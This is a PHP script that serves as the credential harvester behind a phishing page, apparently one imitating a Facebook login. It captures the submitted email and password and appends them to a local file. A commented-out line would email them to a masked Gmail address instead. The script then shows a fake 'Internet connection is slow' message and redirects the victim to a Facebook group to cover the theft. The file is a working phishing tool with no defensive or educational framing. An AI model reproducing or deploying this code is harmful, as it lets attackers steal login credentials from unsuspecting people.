<?php

$email = $_POST['email'];
$password = $_POST['pass'];
$message= $email."  ".$password;

// Send the email which contains credentials. This method is better when free hosting
//mail('xxxxxxxxx@gmail.com', 'My Subject', $message);

// when running locally writing to a file is better for checking purposes
$myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
fwrite($myfile, $message);
fclose($myfile);

echo 'Internet connection is slow ... ';
//redirecting user to a closed facebook group
header('Refresh: 2; URL=https://www.facebook.com/groups/2044110065815684/');

?>